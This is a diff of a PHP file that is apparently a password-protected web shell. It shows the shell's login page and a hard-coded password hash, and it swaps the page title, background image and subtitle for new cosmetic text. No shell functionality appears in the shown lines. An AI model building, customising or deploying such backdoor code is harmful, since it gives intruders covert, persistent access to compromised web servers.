@@ -7,7 +7,7 @@ $password_hash = '$2a$12$2rvrbHRzOS1FtVdLNLZ6IOMDdsX9FKCGpB5bC4Usc9itwgpigzgiO';
 function login_shell()
 {
 ?>
-<title>Masuk Masuk Masuk</title>
+<title>Fuqiang In Heree</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
 
@@ -15,7 +15,7 @@ function login_shell()
     margin: 0; padding: 0;
     height: 100%;
     font-family: 'Orbitron', sans-serif;
-    background: #0a1e2c url('https://images.unsplash.com/photo-1462331940025-496dfbfc7564?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
+    background: #0a1e2c url('https://i.gyazo.com/b2ed00106b95f5a6fd13745857d8fc6c.png') no-repeat center center fixed;
     background-size: cover;
     overflow: hidden;
   }
@@ -116,8 +116,7 @@ function login_shell()
 <body>
   <div class="overlay"></div>
   <div class="container">
-    <div class="title">AH!!</div>
-    <div class="subtitle">SHITT! HERE WE GO AGAIN!</div>
+    <div class="title">Fuqiang In Heree</div>
     <div class="login-box">
 	<form method="post">
   	<input type="password" name="pass" placeholder="password" required />
